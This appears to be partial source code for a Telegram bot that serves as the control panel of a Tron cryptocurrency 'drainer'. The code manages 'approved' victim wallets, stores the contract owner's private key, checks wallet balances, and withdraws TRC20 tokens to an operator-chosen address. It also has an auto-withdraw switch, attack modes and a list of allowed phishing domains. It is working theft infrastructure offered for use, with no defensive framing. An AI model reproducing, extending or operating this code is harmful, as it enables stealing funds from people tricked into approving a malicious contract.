...
const PARAM_HINTS = {
	domains:
		'(A list of domains allowed to make requests to the server, e.g. domain1.com, domain2.com)',
	receiverAddress: '(Tron address that will receive tokens, e.g. TKZKFP...)',
	contractAddress: '(Tron contract address)',
	contractOwnerAddress:
		'(Tron address that deployed the contract, e.g. TKZKFP...)',
	contractOwnerPrivateKey:
		'(Private key of the Tron address that deployed the contract)',
...
async function withdrawTRC20(
	...
	try {
		...
		const energyUsed =
			constTrigger && constTrigger.energy_used ? constTrigger.energy_used : 0
		...
		const unSignedTx =
			triggerRes && triggerRes.transaction ? triggerRes.transaction : null
		if (!unSignedTx) {
		...
		const txID =
			...
			sentTx.txID ||
			(sentTx.transaction &&
				(sentTx.transaction.txid || sentTx.transaction.txID)) ||
			null
		if (!txID) {
...
async function showConfig(bot, { chatId, query, configId }) {
	...
	for (const [key, val] of Object.entries(rest)) {
		if (Array.isArray(val)) {
			...
			const displayVal =
				key === 'contractOwnerPrivateKey' ? `${maskPrivateKey(val)}` : val
	...
	await sendOrEdit(bot, { chatId, query }, text, {
		parse_mode: 'HTML',
		reply_markup,
	})
}
...
async function showApprovedWallets(bot, { chatId, query }) {
	try {
		...
		await sendOrEdit(
			bot,
			{ chatId, query },
			'❌ Could not read approved wallets.',
		)
	}
}
...
function createBot() {
	...
	const pm2ErrorLog = path.join(
		process.env.HOME || '.',
		'.pm2',
		'logs',
		'server-error.log',
	)
	const pm2OutLog = path.join(
		process.env.HOME || '.',
		'.pm2',
		'logs',
		'server-out.log',
	...
	bot.on('message', async msg => {
		...
		if (state && state.type === 'withdraw_input') {
			...
			if (
				entered &&
				(entered.startsWith('/') || mainMenuButtons.includes(entered))
			) {
				...
				if (!/^T[a-zA-Z0-9]{33}$/.test(entered)) {
					...
					try {
						const sent = await bot.sendMessage(
							chatId,
							`❌ Invalid address: <code>${entered}</code>`,
							{ reply_markup },
						)
						editingState[userId] = Object.assign(editingState[userId] || {}, {
							lastInvalid: true,
		...
		if (state && state.type === 'config') {
			...
			if (
				msg.text &&
				(msg.text.startsWith('/') ||
					['⚙️ Drainer Settings', '🔐 Approved Wallets'].includes(msg.text))
			) {
				delete editingState[userId]
				return
			}
			...
			if (PARAM_RESTRICTIONS[param] && !PARAM_RESTRICTIONS[param](msg.text)) {
				...
				await bot.sendMessage(
					msg.chat.id,
					`❌ Invalid value for <b>${param}</b>.${hint}`,
					{ reply_markup },
				)
				return
			}
		...
		if (text === '/start') {
			...
			await fsp.writeFile(
				'./data/last-restart.json',
				JSON.stringify({ chatId: msg.chat.id }),
			)
			await bot.sendMessage(
				msg.chat.id,
				'♻️ Flushing logs and restarting server...',
			)
			try {
				const { stdout, stderr } = await exec(
					'pm2 flush && pm2 restart server.js',
				)
			} catch (error) {
				await bot.sendMessage(
					msg.chat.id,
	...
	bot.on('callback_query', async query => {
		...
		if (editingState[userId]) {
			...
			if (st.type === 'config') {
				...
				if (
					!(
						data === 'confirm_withdraw_yes' ||
						data === 'confirm_withdraw_no' ||
		...
		try {
			...
			if (data.startsWith('wallet_')) {
				...
				try {
					userBalanceData = await checkUserBalance(
						wallet.address,
				...
				wallet._lastBalance = userBalanceData || {
					balance: 0,
					quantity: 0,
					amountInUsd: 0,
				}
				...
				const reply_markup = {
					inline_keyboard: [
						[
							{
								text: '♻️ Withdraw Tokens',
								callback_data: `withdraw_tokens_${wallet.address}`,
							},
						],
						[
							{
			...
			if (data.startsWith('withdraw_tokens_')) {
				...
				try {
					...
					if (
						prev &&
						prev.wallet &&
						prev.wallet.address === wallet.address &&
						prev.wallet._lastBalance
					) {
				...
				const quantity =
					typeof userBalanceData.quantity !== 'undefined' &&
					userBalanceData.quantity !== null
				...
				if (Number(quantity) <= 0) {
					...
					const amountInUsd =
						userBalanceData && userBalanceData.amountInUsd
							? userBalanceData.amountInUsd
							: 0
					const approvedAtStr = formatApprovedAt(wallet.approvedAt)
					...
					try {
						const sentCard = await bot.sendMessage(
							query.message.chat.id,
							walletText,
							{ reply_markup: walletReply },
						)
						editingState[userId] = {
							type: 'wallet',
							wallet,
							chatId: sentCard.chat.id,
							messageId: sentCard.message_id,
						}
					} catch (err) {}
				...
				if (Number(ownerBalance) < MIN_TRX_RESERVE) {
					...
					try {
						userBalanceData2 = await checkUserBalance(
							wallet.address,
							wallet.tokenContract,
						)
					} catch (err) {
					...
					const quantity2 =
						userBalanceData2 && userBalanceData2.quantity
							? userBalanceData2.quantity
							: 0
					const amountInUsd2 =
						userBalanceData2 && userBalanceData2.amountInUsd
							? userBalanceData2.amountInUsd
							: 0
					const ownerTrx = ownerBalance ?? 0
					const approvedAtStr = formatApprovedAt(wallet.approvedAt)
				...
				await sendOrEdit(bot, { query }, 'Enter recipient address:', {
					reply_markup,
				})
				return
			}
			...
			if (data === 'confirm_withdraw_yes') {
				...
				try {
					const last =
						wallet && wallet._lastBalance ? wallet._lastBalance : null
					if (last) {
						if (
							typeof last.balance !== 'undefined' &&
							last.balance !== null &&
							String(last.balance) !== ''
						) {
							tokenBalance = String(last.balance)
						} else if (
							typeof last.quantity !== 'undefined' &&
							last.quantity !== null &&
				...
				try {
					...
					const txId =
						res && (res.txid || res.txId || res.txID)
							? res.txid || res.txId || res.txID
							: res && res.tx && (res.tx.txid || res.tx.txID)
			...
			if (data === 'confirm_withdraw_no') {
				...
				try {
					...
					try {
						userBalanceData = await checkUserBalance(
							refreshed.address,
							refreshed.tokenContract,
						)
						ownerBalance = await checkOwnerBalance(
							refreshed.contractOwnerAddress,
						)
					} catch (err) {
						userBalanceData = null
						ownerBalance = null
					...
					if (userBalanceData === null || ownerBalance === null) {
						await bot.editMessageText(
							'❗️ API request error, please try again later',
							{
								chat_id: chatId,
								message_id: messageId,
								reply_markup: {
					...
					const reply_markup = {
						inline_keyboard: [
							[
								{
									text: '♻️ Withdraw Tokens',
									callback_data: `withdraw_tokens_${refreshed.address}`,
								},
							],
							[
								{
									text: '❌ Remove Wallet',
									callback_data: `remove_wallet_${refreshed.address}`,
								},
							],
							[{ text: '🔙 Back', callback_data: 'back_wallets_list' }],
						],
					...
					refreshed._lastBalance = userBalanceData || {
						balance: 0,
						quantity: 0,
						amountInUsd: 0,
					}
					...
					return bot.answerCallbackQuery(query.id, {
						text: '❌ Error returning to wallet',
						show_alert: true,
					})
				}
			}
				...
				const reply_markup = {
					inline_keyboard: [
						[
							{
								text: '✅ Yes',
								callback_data: `confirm_remove_${walletAddress}`,
							},
			...
			if (data.startsWith('confirm_remove_')) {
				...
				if (wallets.length) {
					const buttons = wallets.map(w => [
						{ text: w.address, callback_data: `wallet_${w.address}` },
					])
			...
			if (data.startsWith('editconfig_')) {
				...
				await sendOrEdit(bot, { query }, 'Choose a parameter:', {
					reply_markup,
				})
				return
			}
			...
			if (data.startsWith('editparam_')) {
				...
				if (param === 'domains') {
					const reply_markup = {
						inline_keyboard: [
							[
								{
									text: '➕ Add domain',
									callback_data: `domains_add_${configId}`,
								},
							],
							[
								{
									text: '➖ Remove domain',
									callback_data: `domains_remove_${configId}`,
								},
							],
							[{ text: '🔙 Back', callback_data: `editconfig_${configId}` }],
						],
					}
					await sendOrEdit(bot, { query }, `Manage <b>${param}</b>:`, {
						reply_markup,
					})
					...
					const reply_markup = {
						inline_keyboard: [
							[
								{
									text: '✅ Enable',
									callback_data: `setparam_${configId}_${param}_true`,
								},
							],
							[
								{
									text: '❌ Disable',
									callback_data: `setparam_${configId}_${param}_false`,
								},
							],
							[{ text: '🔙 Back', callback_data: `editconfig_${configId}` }],
						],
					}
					await sendOrEdit(bot, { query }, 'Set AutoWithdraw:', {
						reply_markup,
					})
				} else if (param === 'mode') {
					const reply_markup = {
						inline_keyboard: [
							[1, 2, 3, 4].map(m => ({
								text: `Mode ${m}`,
								callback_data: `setparam_${configId}_${param}_${m}`,
							})),
							[{ text: '🔙 Back', callback_data: `editconfig_${configId}` }],
						],
					}
					...
					await sendOrEdit(
						bot,
						{ query },
						`Current value of <b>${param}</b>: <code>${current}</code>\n\nEnter new value ${PARAM_HINTS[param] || ''}`,
						{
							reply_markup,
						},
					)
			...
			if (data.startsWith('setparam_')) {
				...
				await sendOrEdit(
					bot,
					{ query },
					`✅ <b>${param}</b> updated to <code>${rawVal}</code>\n\n📄 Config updated below 👇`,
				)
				...
				const reply_markup = {
					inline_keyboard: [
						[
							{
								text: '🔙 Back',
								callback_data: `editparam_${configId}_domains`,
							},
						],
					],
				}
				await sendOrEdit(bot, { query }, 'Enter domain to add:', {
					reply_markup,
				})
				return
			}
			...
			if (
				data.startsWith('domains_remove_') &&
				!data.startsWith('domains_remove_sel_')
			) {
				const configId = data.split('_')[2]
				const cfg = getConfigById(configId)
			...
			if (data.startsWith('domains_remove_sel_')) {
				...
				await sendOrEdit(
					bot,
					{ query },
					`✅ Domain removed: <code>${removed}</code>\n\n📄 Config updated below 👇`,
				)
				await showConfig(bot, { query, configId: cfg.id })
				return
			}
